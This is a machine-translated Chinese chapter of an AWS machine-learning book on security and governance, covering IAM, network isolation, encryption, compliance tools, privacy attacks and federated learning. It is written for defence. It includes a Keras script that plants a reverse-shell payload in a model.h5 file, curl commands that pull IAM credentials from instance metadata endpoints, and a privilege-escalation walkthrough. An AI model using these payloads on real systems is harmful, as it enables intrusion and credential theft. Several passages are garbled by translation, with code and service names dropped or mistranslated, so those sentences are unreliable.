

# 九、安全、治理和合规策略

在本书的前八章中，我们专注于让我们的**机器学习** ( **ML** )实验和部署在云中工作。除此之外，我们还能够使用各种服务来分析、清理和转换几个样本数据集。对于一些实际操作的例子，我们利用了合成生成的数据集，从安全的角度来看，这些数据集使用起来相对安全(因为这些数据集不包含**个人身份信息** ( **PII** ))。在前面的章节中，我们已经完成了很多事情，但是需要注意的是，让**数据工程**和 **ML 工程**工作负载在我们的 AWS 账户中运行只是第一步！一旦我们需要处理生产级别的 ML 需求，我们就不得不担心 ML 系统和流程的**安全性**、**治理**和**符合性**的其他挑战。为了应对这些挑战，我们必须使用各种解决方案和技术来帮助我们预防、检测、缓解和报告这些问题。

在本章中，我们将讨论以下主题:

*   管理 ML 环境的安全性和合规性
*   保护数据隐私和模型隐私
*   建立 ML 治理

与本书中的其他章节不同，本章不包括完整的分步解决方案，因为我们将讨论广泛的安全主题。这些主题将涵盖关于如何保护我们在前面章节中讨论的不同服务和解决方案的不同策略和技术。对于这些主题中的每一个，我们将更深入地探究相关的副主题。我们还将讨论几个安全最佳实践，它们可以很容易地在 AWS 上运行的现有 ML 环境上实现。牢记这些目标，让我们开始吧！

# 管理 ML 环境的安全性和合规性

数据科学团队通常花费大量时间处理数据，训练 ML 模型，并将模型部署到推理端点。由于成功实现其主要目标需要大量的工作和研究，这些团队通常不重视任何与安全性和法规遵从性相关的“额外工作”。在云中运行生产级 ML 工作负载几个月后，由于以下原因，这些团队可能会遇到各种与安全相关的问题:

*   *对安全性、治理和合规性的重要性缺乏理解和认识*
*   *对相关合规法规和政策缺乏了解*
*   *缺乏可靠的安全流程和标准*
*   *内部跟踪和报告机制不佳*

为了更好地了解如何正确管理和处理这些问题，我们将在本节中深入探讨以下主题:

*   认证和授权
*   网络安全性
*   静态和传输中的加密
*   管理合规报告
*   漏洞管理

我们将从如何使用 **AWS 身份和访问管理** ( **IAM** )服务的最佳实践开始，以保护我们在前面章节中使用的不同 ML 工程和数据工程服务。

## 认证和授权

在 [*第 4 章*](B18638_04.xhtml#_idTextAnchor079) ，*AWS 上的无服务器数据管理*中，我们创建了一个 IAM 用户，并为其附加了一些现有策略。除此之外，我们创建并附加了一个自定义内联策略，为 IAM 用户提供管理**红移无服务器**和**湖泊形成**资源的必要权限。如果你已经着手于上述章节的解决方案，你可能会想，*为什么要费这么大的劲来设置它？*首先，在撰写本文时，Redshift Serverless 不支持使用 root 帐户执行查询。同时，使用具有有限权限集的 IAM 用户比直接使用 root 帐户更安全。这限制了攻击者在用户帐户受到威胁的情况下可能造成的损害。

注意

在我们的例子中，如果 IAM(非 root)用户帐户受到威胁，攻击者只能对我们的红移无服务器和湖泊形成资源造成损害(除非他们可以执行**权限提升攻击**)。这个话题我们一会儿再详细说！

如果 root 帐户的访问密钥和/或凭据被盗，攻击者将完全访问所有 AWS 服务的所有资源。另一方面，如果权限有限的 IAM 用户的访问密钥和/或凭据被盗，攻击者将只能访问 IAM 用户可以访问的资源。

假设我们不小心将以下代码推送到 GitHub 或 GitLab 中的公共存储库中:

```
import boto3

sagemaker_client = boto3.client(

    'sagemaker-runtime',

    aws_access_key_id="<INSERT ACCESS KEY ID>",

    aws_secret_access_key="<INSERT SECRET ACCESS KEY>"

)
```

假设这里使用的凭据链接到一个 root 帐户用户，攻击者可以使用这些凭据进行“大规模破坏”，例如删除帐户中的所有现有资源或创建将用于攻击其他帐户的新资源。

注意

*如何？*一个可能的举动是，黑客使用从源代码获得的凭证和推送到公共存储库的历史来配置 AWS CLI，然后运行 AWS CLI 命令，终止 AWS 帐户中所有正在运行的资源。

为了防止这种情况发生，我们可以使用下面的代码块来代替:

```
sagemaker_client = boto3.client('sagemaker-runtime')
```

在这里，我们期望`boto3`自动定位并使用来自脚本运行环境的凭证。例如，如果脚本在 AWS Cloud9 环境中运行，凭证可能存储在`~/.aws`目录中。

除此之外，这里的是一些确保 IAM 设置安全的最佳实践和推荐步骤:

*   停止使用并删除 AWS root 帐户的访问密钥(如果可能)。
*   对 root 帐户和所有 IAM 用户启用**多因素认证** ( **MFA** )。
*   定期轮换访问密钥和密码。
*   尽可能使用(并假设)IAM 角色来委派权限，而不是使用长期密码或访问密钥凭据。
*   如果可能，定期(例如，每 90 天)过期并轮换密码和密钥。
*   使用 **IAM 策略模拟器**和 **IAM 访问分析器实现最低权限配置。**

除了遵循最佳实践，我们还应该定期检查任何 IAM 权限配置错误。我们必须花时间深入挖掘并验证什么是可利用的。首先，对 IAM 用户具有有限权限集的攻击者可以执行`iam:AddUserToGroup`权限，攻击者可以使用 AWS CLI(或任何替代方法)将 IAM 用户添加到现有的 IAM 组，该 IAM 组具有较少的权限集。如果`AdministratorAccess`托管策略被附加到一个现有的 IAM 组，攻击者可以将受损的 IAM 用户添加到附加了`AdministratorAccess`托管策略的组，以获得对整个 AWS 帐户的完全管理员访问权限。请注意，这只是可能的情况之一，还有其他几种已知的权限提升方法。在某些情况下，攻击者在获得完全管理员访问权限之前，可能会使用这些技术的链或组合。为了防止这些类型的攻击，我们应该尽可能避免授予`iam:*`权限。

此时，您可能想知道，*我们如何测试 AWS 帐户的安全性*？有几个工具，包括开源开发框架和安全测试工具包，如 **Pacu** 、 **ScoutSuite** 和 **WeirdAAL** ( **AWS 攻击库**)可以用于评估和测试云环境的安全性。我们不会在本书中讨论如何使用这些工具，所以请随意单独查看这些工具。

注意

当攻击者获得 AWS 帐户的完全管理员访问权限时会发生什么？嗯，各种可怕的事情都可能发生！首先，攻击者现在可以自由地旋转 AWS 资源，比如 EC2 实例，这些资源可以用来攻击其他帐户和系统。攻击者还可以使用受损的帐户来挖掘加密货币(例如，比特币)。攻击者还应该能够窃取和访问受影响的 AWS 帐户中托管的数据库中存储的数据。也有可能删除所有 AWS 资源。

在结束本节之前，让我们讨论一下 SageMaker 执行角色是如何工作的，这样我们就可以更好地了解如何提高 ML 环境设置的安全性。当我们使用`get_execution_role`函数时，我们被赋予为 SageMaker Studio 或代码运行的 Notebook 实例创建的 IAM 角色:

```
from sagemaker import get_execution_role

role = get_execution_role()
```

根据这个 IAM 角色的设置方式，它可能附带有`AmazonSageMakerFullAccess` IAM 策略，该策略授予对几个 AWS 服务的访问权限。如果配置了一组限制较少的权限，可以获得 SageMaker Studio 或笔记本实例访问权限的攻击者可能会使用权限提升攻击来获得额外的权限。假设您计划为 10 名参与者举办一次 ML 研讨会。为了进行设置，首先为每个参与者创建一个 IAM 用户来访问一个专用的笔记本实例(或相应的 SageMaker Studio 域和用户集)，如下图所示:

![Figure 9.1 – Sample IAM configuration of an ML workshop environment

](img/B18638_09_001.jpg)

图 9.1–ML 车间环境的示例 IAM 配置

在这里，IAM 用户只有列出和访问可用笔记本实例的权限。但是，笔记本实例附加了 IAM 角色，这些角色可能具有额外的权限，攻击者可能会利用这些权限。也就是说，一旦攻击者(作为研讨会参与者)使用一个 IAM 用户访问研讨会期间可用的一个笔记本实例，攻击者只需在笔记本实例的终端内打开一个`curl`命令:

```
curl http://169.254.169.254/latest/meta-data/identity-

credentials/ec2/security-credentials/ec2-instance
```

或者，如果您已经设置并使用 **SageMaker Studio** 来代替 workshop，攻击者可以运行以下命令并获得安全凭证:

```
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

一旦凭证被泄露，攻击者现在就有了各种关于如何使用这些凭证来执行特定攻击的选项。*吓人吧？*如果附加到笔记本实例的 IAM 角色附加了`AdministratorAccess`受管策略，该怎么办？这意味着攻击者将能够使用权限提升攻击获得完全的管理员访问权限！

为了减轻和管理与此类似的场景相关的风险，建议在配置附加到 AWS 资源的 IAM 角色时实践最小特权原则。这意味着我们需要更深入地研究附加到 IAM 角色的策略，并检查哪些权限可以删除或减少。这将限制潜在的损害，即使在特权提升攻击已经执行之后。除此之外，如果您要举办一次 ML 研讨会，您可能希望利用 **SageMaker Studio Lab** 而不是在您的 AWS 帐户中创建笔记本实例供参与者使用。通过这种方法，研讨会参与者可以在不使用 AWS 帐户的情况下运行 ML 训练实验和部署。同时，使用 SageMaker Studio Lab 是免费的，非常适合研讨会！

注意

关于这个话题的更多信息，请查看 https://studiolab.sagemaker.aws/。

## 网络安全

在训练和部署 ML 模型时，ML 工程师可能会意外地使用包含攻击者准备的恶意代码的库或自定义容器映像。例如，攻击者可能会生成一个包含反向 shell 负载的`model.h5`文件:

```
import tensorflow

from tensorflow.keras.layers import Input, Lambda, Softmax

from tensorflow.keras.models import Model

from tensorflow.keras.optimizers import Adam

def custom_layer(tensor):

    PAYLOAD = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2>&1 | nc 127.0.0.1 14344 > /tmp/FCMHH'

    __import__('os').system(PAYLOAD)

    return tensor

input_layer = Input(shape=(10), name="input_layer")

lambda_layer = Lambda(

    custom_layer,   

    name="lambda_layer"

)(input_layer)

output_layer = Softmax(name="output_layer")(lambda_layer)

model = Model(input_layer, output_layer, name="model")

model.compile(optimizer=Adam(lr=0.0004), loss="categorical_crossentropy")

model.save("model.h5")
```

在这里，攻击者利用 **Keras Lambda 层**的优势运行定制函数。加载生成的文件类似于使用 TensorFlow 加载其他模型的方式:

```
from tensorflow.keras.models import load_model

load_model("model.h5")
```

这有不同的变体，包括向 pickle 文件和 YAML 文件注入有效载荷，这会影响其他库和框架，如 *scikit-learn* 和 *PyTorch* 。

注意

有关如何在 ML 模型文件中注入恶意有效载荷的更多示例，请查看[https://gist . github . com/Joshua lat/a 3 fdfa 4d 49 D1 d 6725 b 1970133d 06866 b](https://gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b)。

一旦反向 shell 负载在 ML 实例的训练和推理容器中执行，攻击者就能够访问数据并将其传输到外部服务器。为了防止这些类型的攻击，我们可以启用`Estimator`对象，类似于下面的代码块所示:

```
estimator = Estimator(

    image,

    role,

    instance_type='ml.p2.xlarge',

    ...

    enable_network_isolation=True

)
```

一旦我们在后面的步骤中使用`fit()`方法运行训练作业，当训练作业运行时，ML 实例中的训练容器将不再具有网络访问权。

注意

当然，我们的第一层防御是避免使用来自不可信和潜在危险来源的模型和代码。然而，尽管我们的初衷是好的，我们仍然可能会意外地下载受损的资源。这就是为什么我们需要利用网络隔离解决方案作为下一层防御的原因。

我们可以通过准备和使用没有以下内容的 **VPC** 来进行类似的安全设置:

*   一个**互联网网关**，使公共子网中的资源能够上网
*   一个 **NAT 网关**，它允许私有子网中的资源建立“单向”出站连接
*   允许来自 VPC 内外的资源相互通信的其他类似网关

通过这种设置，部署在 VPC 内部的资源将无法连接到互联网。也就是说，如果我们在 VPC 部署的 EC2 实例中运行包含恶意代码的训练脚本，恶意代码将无法访问互联网和连接到 VPC 以外的服务器和资源。*如果我们想从 S3 存储桶上传和下载文件，该怎么办？*为了使其工作，我们将需要配置 **VPC 端点**来启用到 AWS 服务(如 S3)的网络连接。如果我们想要连接到另一个 VPC 内部的资源，我们可以使用 **AWS PrivateLink** 并使用它们的私有 IP 地址访问这些资源。使用这种方法，在使用 AWS PrivateLink(一个接口 VPC 端点)时，不需要通过 internet 访问资源，也不需要存在 internet 网关。

可以设置以下内容,以便可以通过 PrivateLink 更安全地直接访问 AWS 资源:

*   通过 PrivateLink 访问**亚马逊雅典娜**
*   通过 PrivateLink 访问 **AWS Lambda**
*   通过 PrivateLink 将连接到**亚马逊红移**
*   通过 PrivateLink 调用 **SageMaker 推理端点**
*   通过 PrivateLink 将连接到 **SageMaker 工作室**
*   通过 PrivateLink 访问 **API 网关**API

请注意，这并不是使用 PrivateLink 可以保护的内容的详尽列表，因为还有一长串与 PrivateLink 集成的服务。

注意

有关支持的服务列表的更多信息，请查看[https://docs . AWS . Amazon . com/VPC/latest/private link/AWS-services-private link-support . XHTML](https://docs.aws.amazon.com/vpc/latest/privatelink/aws-services-privatelink-support.xhtml)。

## 静态和传输中的加密

当训练 ML 模型时，SageMaker 支持多种数据源选项。在大多数情况下，ML 工程师默认使用**亚马逊 S3** 桶作为默认数据源。在其他情况下，将使用**亚马逊弹性文件系统** ( **亚马逊 EFS** )来代替，特别是对于需要更高吞吐量的工作负载。对于更高的性能吞吐量需求，我们可以将 **Amazon FSx 用于 Lustre** (它可以链接到源的 S3 桶)。这些存储选项与 **AWS 密钥管理服务** ( **AWS KMS** )相集成，这有助于确保数据在写入文件系统之前被自动加密(即，没有密钥就无法读取)。一旦需要加载和读取数据，就会自动解密。

注意

如需了解更多关于加密学概念的信息，如**不对称和对称加密**、**解密**和**信封加密**，请随意查看[https://docs . AWS . Amazon . com/crypto/latest/user guide/cryptography-concepts . XHTML](https://docs.aws.amazon.com/crypto/latest/userguide/cryptography-concepts.xhtml)。

注意，使用 KMS 时，我们有两个选项。第一个涉及使用默认的 **AWS 管理的密钥**，第二个涉及创建和使用**客户管理的密钥**。*我们何时应该使用客户管理的密钥？*如果我们想要更多的控制，例如启用密钥沿旋转，并带有撤销、禁用或删除密钥访问的选项，那么我们应该选择使用客户管理的密钥。如果您想知道连接到训练和托管实例的存储卷是否可以用 KMS 客户管理的密钥加密，那么答案也是*是的*。要使用客户管理的密钥，我们只需指定一个可选的 KMS 密钥 ID，类似于下面的代码块:

```
estimator = Estimator(

    image,

    ...

    volume_kms_key=<insert kms key ARN>,

    output_kms_key=<insert kms key ARN>

)

...

estimator.deploy(

    ...

    kms_key=<insert kms key ARN>

)
```

在这里，我们可以看到，我们还可以指定一个可选的 KMS 密钥，用于加密亚马逊 S3 中的输出文件。除了加密静态数据，我们还需要在执行分布式训练时确保安全的数据传输。当执行训练作业时使用多个实例时，我们可以启用**容器间流量加密**来保护实例间传输的数据。如果我们需要遵守特定的法规要求，我们需要确保传输的数据也是加密的。

使用 **SageMaker Python SDK** 时，启用容器间流量加密非常简单:

```
estimator = Estimator(

    image,

    ...

    encrypt_inter_container_traffic=True

)
```

那不是很容易吗？在启用集装箱间流量加密之前，请确保您了解其对整体训练时间和训练工作成本的潜在影响。当使用分布式深度学习算法时，在增加这一额外的安全级别后，整体训练时间和成本可能会增加。对于`NetworkConfig`对象，类似于下面的代码块:

```
config = NetworkConfig(

    enable_network_isolation=True,

    encrypt_inter_container_traffic=True

)

processor = ScriptProcessor(

    ...

    network_config=config

)

processor.run(

    ...

)
```

请注意，这种方法应该适用于不同“类型”的处理作业，如下所示:

*   `SageMakerClarifyProcessor`用于模型可解释性需求和自动化偏差度量计算
*   `PySparkProcessor`用于加工使用 **PySpark** 的工作
*   `SKLearnProcessor`使用 **scikit-learn** 加工作业

SageMaker 还支持在处理数据、训练和部署模型时使用定制容器映像。这些集装箱图片，存储在`docker push`命令里面，ECR 自动加密这些图片。一旦这些容器图像被提取(例如，使用`docker pull`命令)，ECR 自动解密这些图像。

除此之外，我们可以用 KMS 在 SageMaker 中加密以下内容:

*   SageMaker Studio 存储卷
*   SageMaker 处理作业的输出文件
*   SageMaker 地面实况标注作业的输出数据
*   SageMaker 特色店线上和线下店

注意

大概是我们第一次在这本书里提到 **SageMaker 地面真相**和 **SageMaker 特色店**！如果你想知道这些是什么，SageMaker Ground Truth 是一个数据标注服务，它可以帮助 ML 从业者使用各种选项准备高质量的标注数据集，而 SageMaker Feature Store 是一个完全管理的特征存储，ML 模型的特征可以在其中存储、共享和管理。我们不会在本书中深入讨论这些如何工作的细节，所以请随意查看[https://docs . AWS . Amazon . com/sagemaker/latest/DG/data-label . XHTML](https://docs.aws.amazon.com/sagemaker/latest/dg/data-label.xhtml)和 https://docs . AWS . Amazon . com/sagemaker/latest/DG/feature-store . XHTML 以了解这些主题的更多细节。

*如果我们在 SageMaker 之外执行数据处理、模型训练和模型部署会怎样？*好消息是，AWS 平台中的许多服务都与 KMS 集成在一起。这意味着通常只是启用服务器端加密的一个小的配置更改。以下是 KMS 立即可用的一些示例:

*   EBS 卷加密
*   红移群集加密
*   亚马逊 S3 对象的加密
*   对由 Glue DataBrew 作业写入的数据加密
*   加密存储在 CloudWatch 日志中的日志数据

我们还可以在将数据发送到 AWS 服务(例如，亚马逊 S3)之前，使用 **AWS 加密 SDK** 来加密数据。使用相同的客户端加密库，我们可以在从存储位置检索数据后对其进行解密。

注意

在 AWS 上处理加密和解密需求时，有几个选项可供选择。除了到 **AWS KMS** 和 **AWS 加密 SDK** ，还有dynamo db 加密客户端和 **AWS CloudHSM** 。我们不会深入研究其中的每一个，所以请查看 https://docs . AWS . Amazon . com/crypto/latest/user guide/AWS cryp-choose-toplevel . XHTML 以了解更多信息。

除了已经讨论过的内容之外，我们还必须知道一些额外的技术，这些技术是关于在使用 EC2 实例满足 ML 需求时如何保护和加密传输中的数据的。在 [*第二章*](B18638_02.xhtml#_idTextAnchor041) ，*深度学习 AMIs* 中，我们从一个 EC2 实例内部的命令行启动了 **Jupyter 笔记本**应用。您可能已经注意到，我们使用 HTTP 而不是 HTTPS 来访问应用。我们可以做的改进之一是使用 SSL(使用 web 证书)来加密服务器和浏览器之间的流量。另一个解决方案是使用 SSH 隧道访问 Jupyter 笔记本应用。*宋承宪什么？* SSH 隧道是一种机制，涉及在两台计算机之间使用加密的 SSH 连接，通过安全通道转发连接:

![Figure 9.2 – SSH tunneling

](img/B18638_09_002.jpg)

图 9.2–SSH 隧道

在这里，我们可以看到我们可以从本地机器访问 Jupyter Notebook 应用，即使该应用运行在 EC2 实例中。这里，我们利用 SSH 隧道通过 SSH 在安全通道上转发连接。

为此，我们只需运行类似于下面命令块中的命令(假设我们的本地机器是 Unix 操作系统):

```
ssh <user>@<IP address of instance> -NL 14344:localhost:8888
```

在命令运行之后，我们应该能够通过在浏览器中访问以下链接来本地访问 Jupyter 笔记本应用: [http://localhost:14344](http://localhost:14344) 。

现在，我们已经讨论了几种加密数据的技术，让我们继续讨论一些可以用来帮助我们管理环境合规性的服务。

## 管理合规报告

除了确保 ML 环境和系统的安全，数据科学团队还必须管理 AWS 帐户中使用的流程和资源配置的整体合规性。管理合规性包括确定一个组织需要遵守的相关法规和指导方针(例如 **HIPAA** 、 **PCI-DSS** 和 **GDPR** )以及执行建议的一组步骤来实现(并保持)所需的合规性。

AWS 和客户共享安全性和合规性。客户通常需要关注以下几个方面:

*   客户操作系统
*   任何运行在 AWS 服务之上的应用
*   所使用的不同 AWS 资源的配置

注意

关于**共享责任模型**的更多细节，请查看[https://AWS . Amazon . com/compliance/Shared-respons ibility-Model/](https://aws.amazon.com/compliance/shared-responsibility-model/)。

在处理法规遵从性实施和报告时，AWS 中有多种服务、工具和功能可用:

*   **AWS 工件**:这是安全和合规性文档、报告和资源的集中来源。在这里，我们可以下载我们需要的相关安全性和合规性文档。
*   **AWS 配置**:这可以用于持续监控 AWS 资源的配置，并实现自动修复，以确保 ML 环境和系统的合规性。
*   **AWS 审计经理**:这个有助于简化 AWS 资源的风险和合规性评估。
*   **AWS 合规中心**:这是云相关监管资源的集中来源。

我们不会深究如何使用这些服务的细节，所以请随意查看本章末尾的*延伸阅读*部分以获得更多细节。在下一节中，我们将快速讨论一些可以帮助我们进行漏洞管理的相关服务。

## 漏洞管理

实施安全最佳实践并不能保证环境或系统免受攻击。除了遵循安全最佳实践和法规遵从性要求之外，团队还应该使用各种漏洞评估和管理工具来检查系统中潜在的可利用漏洞。

在检测和管理 AWS 中的漏洞时使用的一个实用解决方案是 **Amazon Inspector** 。Amazon Inspector 通过自动检测 EC2 实例和推送到 Amazon ECR 的容器映像中的漏洞来实现**自动化漏洞管理**。*这是如何工作的？*每次检测到“变化”时(例如，容器图像推送到 ECR)，Amazon Inspector 会自动扫描资源，因此不需要用户启动手动漏洞扫描。这意味着，如果我们正在为一个 **SageMaker 处理**作业、训练作业或 ML 推理端点准备和构建一个定制的容器映像，那么每当我们向 Amazon ECR 存储库推送一个新版本时，Amazon Inspector 都会自动扫描这个容器映像。如果 Amazon Inspector 检测到并报告了漏洞，下一步我们将对受影响的资源执行必要的补救措施。

注意

关于如何使用和设置 Amazon Inspector 的分步教程，请查看[https://medium . com/@ arvs . lat/automated-vulnerability-management-on-AWS-with-Amazon-Inspector-53c 572 BF 8515](https://medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515)。

除了 Amazon Inspector，我们还可以使用以下服务和功能来管理 AWS 上 ML 环境中的安全风险和漏洞:

*   **亚马逊 CodeGuru 审稿人**:这个可以用来分析代码，使用**安全检测器自动检测安全问题。**
*   **Amazon GuardDuty** :这可以用来自动检测恶意活动，例如 AWS 帐户中的权限提升攻击..
*   **AWS 安全中枢**:这个可以用来自动化安全检查，进行云安全态势管理。

在结束本节之前，让我们快速讨论一下如何使用防火墙保护 ML 推断端点。在 [*第 3 章*](B18638_03.xhtml#_idTextAnchor060) ，*深度学习容器*中，我们使用服务的自定义容器映像支持，在 Lambda 函数内部部署了我们的 ML 模型。然后，我们设置并配置了一个 API 网关 HTTP API 触发器，当有新的端点请求时，它会触发 Lambda 函数。如果我们想保护这个设置并使这个无服务器 API 可供公众使用，我们可以配置一个 **AWS Web 应用防火墙** ( **WAF** )来保护它，如下图所示:

![Figure 9.3 – Using AWS WAF to protect API endpoints

](img/B18638_09_003.jpg)

图 9.3–使用 AWS WAF 保护 API 端点

AWS WAF 通过使用“规则”来保护部署的 web 应用免受利用现有漏洞的利用，这些规则解决的问题包括新出现的**常见漏洞和暴露** ( **CVEs** )、**开放 Web 应用安全项目** ( **OWASP** )十大漏洞等等。

注意

请注意，如果我们有一个 API 网关与 SageMaker 推断端点接口，这个解决方案也将起作用——无论我们使用 **API 网关映射模板**还是 **Lambda 函数**来调用 SageMaker 推断端点。我们还可以使用 AWS WAF 来保护我们的 **Amazon CloudFront** 和**应用负载平衡器** ( **ALB** )资源，以保护在 ALB 后面运行 ML 推理端点的 EC2 实例。

此时，在管理 ML 环境的安全性和法规遵从性时，我们应该对不同的解决方案和策略有一个很好的了解。在下一节中，我们将深入研究保护数据隐私和模型隐私的不同技术。

# 保护数据隐私和模型隐私

当处理 ML 和 ML 工程需求时，我们需要确保保护训练数据，以及生成模型的参数，免受攻击者的攻击。一旦有机会，这些恶意行为者就会进行各种攻击，以提取训练模型的参数，甚至恢复用于训练模型的数据。这意味着 PII 可能会被揭露和窃取。如果模型参数遭到破坏，攻击者可能会通过重新创建您的公司花费数月或数年时间开发的模型来执行推断。*吓人吧？*让我们分享一些攻击者可能实施的攻击示例:

*   **模型反转攻击**:攻击者试图恢复用来训练模型的数据集。
*   **模型提取攻击**:攻击者试图利用预测输出值窃取训练好的模型。
*   **成员推断攻击**:攻击者试图推断一条记录是否是用于训练模型的训练数据集的一部分。
*   **属性推断攻击**:攻击者试图猜测一条训练记录的缺失属性(使用部分可用信息)。

现在我们对一些可能的攻击有了更好的了解，让我们讨论一下我们可以用来保护数据和模型隐私的解决方案和防御机制。

## 联合学习

让我们先从谈论**联合学习**开始，但在此之前，让我们将其与我们执行 ML 训练和部署的典型方式进行比较，后者是*集中式*:

![Figure 9.4 – Centralized ML

](img/B18638_09_004.jpg)

图 9.4–集中式 ML

这里，数据从用户的移动设备被收集到一个集中的位置，其中 ML 模型训练步骤在单个机器上执行(或者使用分布式训练的机器集群)。由于发送到集中位置的数据可能包含关于用户的敏感信息，所以这种方法存在关于数据的所有权、隐私和位置的问题。为了管理这些类型的问题，我们可以利用联合学习，其中训练步骤直接在边缘设备中执行，如下图所示:

![Figure 9.5 – Federated ML

](img/B18638_09_005.jpg)

图 9.5–联合 ML

在这里，只有模型被发送回服务器并相互“合并”以产生一个新的全局模型。这有助于解决隐私保护问题，因为数据保存在边缘设备中。在 [*第 7 章*](B18638_07.xhtml#_idTextAnchor151) 、 *SageMaker 部署解决方案*的*部署策略和最佳实践*部分，我们提到在边缘设备上部署和管理 ML 模型时，我们可以使用 **SageMaker Edge Manager** 以及其他服务。这里，我们假设模型已经被训练，我们只是在部署步骤中使用这些服务。*模特是怎么训练的？以下是一些可能的解决方案:*

*   使用解决方案如 **TensorFlow 联邦**([https://www.tensorflow.org/federated](https://www.tensorflow.org/federated))和 **PyTorch 移动**([https://pytorch.org/mobile/home/](https://pytorch.org/mobile/home/))，其中可以作为用于联邦 ML 要求。
*   使用解决方案，如**Flower**([https://flower.dev/](https://flower.dev/))框架，以及服务，如 **AWS IoT Greengrass** 、 **Amazon ECS** 和 **AWS Step Functions** 来管理训练集群不可预测性和协调器到设备在使用边缘设备执行联合学习时面临的挑战。
*   使用`OpenMined/SwiftSyft`(iOS 设备上)和`OpenMined/KotlinSyft`(Android 设备上)等解决方案来训练和部署用 **TensorFlow** 或 **PyTorch** 编写的 **PySyft** 模型。

注意

什么是 **PySyft** ？这是一个来自 **OpenMined** 的库，它利用联邦学习、差分隐私和加密计算来满足安全和隐私的深度学习需求。如果你想知道什么是**差分隐私**和**加密计算**，我们现在就来讨论这些！

## 差分隐私

现在，我们来谈谈**差分隐私**。差分隐私包括使用保护数据集中个人记录共享信息的技术，这将使攻击者更难逆向工程原始数据。这些技术包括在生成统计数据时向训练数据或模型参数添加精心设计的随机噪声量。以下是一些示例和解决方案:

*   在 SageMaker 中训练**自然语言处理** ( **NLP** )模型和分析数据时，使用一个名为**度量差分隐私**的变体。在这里，训练数据集中单词的“含义”得到保留，同时保护了单个记录的隐私。更多信息，请查看[https://www . Amazon . science/blog/preserving-privacy-in-analyses-of-textual-data](https://www.amazon.science/blog/preserving-privacy-in-analyses-of-textual-data)。
*   在训练隐私保护 ML 模型时使用开源 **TensorFlow 隐私**库，对现有 TensorFlow 代码进行最小的代码更改。更多信息请查看[https://blog . tensor flow . org/2019/03/introducing-tensor flow-privacy-learning . XHTML](https://blog.tensorflow.org/2019/03/introducing-tensorflow-privacy-learning.xhtml)。
*   使用开放的源 **Opacus** 库来训练 PyTorch 模型，同时启用差分隐私。欲了解更多信息，请查看[https://opacus.ai/](https://opacus.ai/)。

注意

如果您想知道如何在 AWS 中使用这些解决方案，我们只需在将要执行ML 实验的资源中安装所需的包和库(例如`opacus`)。例如，如果我们使用一个`pip install opacus`启动一个 EC2 实例。如果我们正在使用`requirements.txt`文件，当使用**脚本模式**或提供一个自定义容器图像，将由 SageMaker 使用。

## 保护隐私的机器学习

在**隐私保护机器学习** ( **PPML** )下还有一类技术，其中 ML 推理可以被执行，即使传递给模型的输入有效载荷被加密。这意味着我们可以在敏感数据作为有效载荷传递给 ML 推断端点之前对其进行保护和加密。在 PPML 模型被用于对加密的有效载荷进行推断之后，结果被加密地返回给发送者。最后一步是发送者对结果进行解密。很酷吧？这方面的一个例子是**隐私保护 XGBoost 模型**，它使使用隐私保护加密方案和工具，例如**保序加密** ( **OPE** )、**伪随机函数** ( **PRFs** )和**附加同态加密**()当使用 **SageMaker 托管服务**部署隐私保护的 XGBoost 模型时，我们可以使用自定义容器映像，这样我们在推断过程中使用的包和代码方面就有了更多的灵活性。请注意，PPML 增加了一些计算开销，与未加密版本相比，生成的模型在性能方面通常较慢。

注意

在本书中，我们不会深入探究PPML 如何工作的细节。更多信息，请查看[https://www . Amazon . science/publications/privacy-preserving-xgboost-inference](https://www.amazon.science/publications/privacy-preserving-xgboost-inference)。

## 其他解决方案和选项

最后，在管理数据隐私方面，数据科学团队应该充分利用他们正在使用的服务和工具的现有安全特性和功能。除了本章其他部分提到的内容之外，在 AWS 中保护数据时，我们还可以使用其他服务和功能:

*   **亚马逊 Macie** :用于通过自动发现 PII 等敏感数据，评估存储在 S3 的数据隐私和安全性。
*   **对行级安全和列级访问控制的红移支持**:用于在红移中实现对表中行和列的细粒度访问。
*   `*******@email.com`而不是`johndoe@email.com`。
*   **对跨账户数据共享的红移支持**:用于跨 AWS 账户共享红移仓库中存储的数据(这样当需要共享访问权限时，数据不再需要复制和转移到另一个账户)。
*   **Amazon OpenSearch 服务字段屏蔽支持**:当在 Amazon OpenSearch 服务中执行搜索查询时，它使用基于模式的字段屏蔽来隐藏敏感数据，如 PII。
*   **S3 对象λ**:自定义代码用于处理和修改 S3 GET 请求的输出(包括屏蔽和编辑数据的能力)。
*   **AWS Lake Formation 对行级和单元级安全性的支持**:这支持对查询结果和 AWS Glue ETL 作业的细粒度访问。
*   **主成分分析(SageMaker 内置算法)**:一种基于 PCA 的变换，用于在保护数据“本质”的同时保护数据隐私。

在这一点上，我们应该对管理数据和模型隐私的不同方法有了更好的理解。在下一节中，我们将讨论 ML 治理，并且我们将讨论 AWS 中可用的不同解决方案。

# 建立 ML 治理

当处理 ML 计划和需求时，必须尽早考虑 ML 治理。由于以下原因，治理不善的公司和团队会遇到短期和长期的问题:

*   *缺乏清晰准确的 ML 模型库存跟踪*
*   *关于模型可解释性和可解释性的限制*
*   *训练数据中存在偏差*
*   *训练和推理数据分布的不一致性*
*   *缺乏自动化的实验谱系跟踪流程*

我们如何应对这些问题和挑战？我们可以通过建立 ML 治理(正确的方式)来解决和管理这些问题，并确保考虑到以下方面:

*   谱系追踪和再现性
*   模型库存
*   模型验证
*   ML 可解释性
*   偏流检波
*   模型监控
*   数据分析和数据质量报告
*   数据完整性管理

我们将在本节中详细讨论其中的每一项。继续之前，请随意喝杯咖啡或茶！

## 血统追踪和再现性

在 [*第 6 章*](B18638_06.xhtml#_idTextAnchor132) ， *SageMaker 训练和调试解决方案*中，我们讨论了如何在使用训练数据集、算法、超参数值的特定配置以及其他相关训练配置参数值作为训练作业的输入之后，产生 ML 模型。

